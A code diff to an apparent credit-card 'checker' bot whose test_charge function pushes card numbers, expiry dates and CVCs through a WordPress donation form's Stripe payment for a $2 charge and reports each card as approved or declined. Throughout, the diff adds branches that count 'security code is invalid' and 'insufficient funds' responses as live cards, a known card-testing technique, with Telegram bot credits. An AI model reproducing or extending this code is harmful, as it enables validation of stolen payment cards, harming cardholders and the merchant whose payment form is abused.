@@ -300,6 +300,41 @@ def test_charge(cc_line):
         
         if response_stripe.status_code != 200:
             error_msg = extract_error_message(response_stripe)
+            
+            # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
+            if "Your card's security code is invalid." in error_msg or "security code is invalid" in error_msg.lower():
+                return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+            
+            # CHECK FOR "Your card has insufficient funds." - APPROVED RESPONSE
+            if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
+                return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+            
             return f"""
 ❌ DECLINED CC
 
@@ -319,6 +354,41 @@ def test_charge(cc_line):
         
         if 'error' in stripe_json:
             error_msg = stripe_json['error'].get('message', 'Unknown Stripe Error')
+            
+            # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
+            if "Your card's security code is invalid." in error_msg or "security code is invalid" in error_msg.lower():
+                return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+            
+            # CHECK FOR "Your card has insufficient funds." - APPROVED RESPONSE
+            if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
+                return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+            
             return f"""
 ❌ DECLINED CC
 
@@ -368,7 +438,7 @@ def test_charge(cc_line):
                 f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce={fn}&'
                 f'_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=diwas%20Khatri&'
                 f'email=khatrieex%40gmail.com&custom-payment-amount=2&'
-                f'description=Telegrm%20%3A-%20%40mhitzxg&payment_method=stripe&'
+                f'description=Telegrm%20%3A-%20%40zx&payment_method=stripe&'
                 f'__stripe_payment_method_id={payment_method_id}'
             ),
             'action': 'fluentform_submit',
@@ -424,6 +494,41 @@ def test_charge(cc_line):
 """
                 else:
                     response_text = response_ajax.text.lower()
+                    
+                    # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
+                    if "Your card's security code is invalid." in response_ajax.text or "security code is invalid" in response_text:
+                        return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                    
+                    # CHECK FOR "Your card has insufficient funds." - APPROVED RESPONSE
+                    if "Your card has insufficient funds." in response_ajax.text or "insufficient funds" in response_text:
+                        return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                    
                     if any(keyword in response_text for keyword in ['payment successful', 'thank you', 'approved', 'charged']):
                         return f"""
 ✅ APPROVED CC
@@ -457,6 +562,41 @@ def test_charge(cc_line):
                 
             except json.JSONDecodeError:
                 response_text = response_ajax.text.lower()
+                
+                # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
+                if "Your card's security code is invalid." in response_ajax.text or "security code is invalid" in response_text:
+                    return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                
+                # CHECK FOR "Your card has insufficient funds." - APPROVED RESPONSE
+                if "Your card has insufficient funds." in response_ajax.text or "insufficient funds" in response_text:
+                    return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                
                 if any(keyword in response_text for keyword in ['payment successful', 'thank you', 'approved', 'charged', 'success']):
                     return f"""
 ✅ APPROVED CC
@@ -488,6 +628,42 @@ def test_charge(cc_line):
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
         else:
+            error_msg = extract_error_message(response_ajax)
+            
+            # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
+            if "Your card's security code is invalid." in error_msg or "security code is invalid" in error_msg.lower():
+                return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+            
+            # CHECK FOR "Your card has insufficient funds." - APPROVED RESPONSE
+            if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
+                return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+            
             return f"""
 ❌ DECLINED CC
 
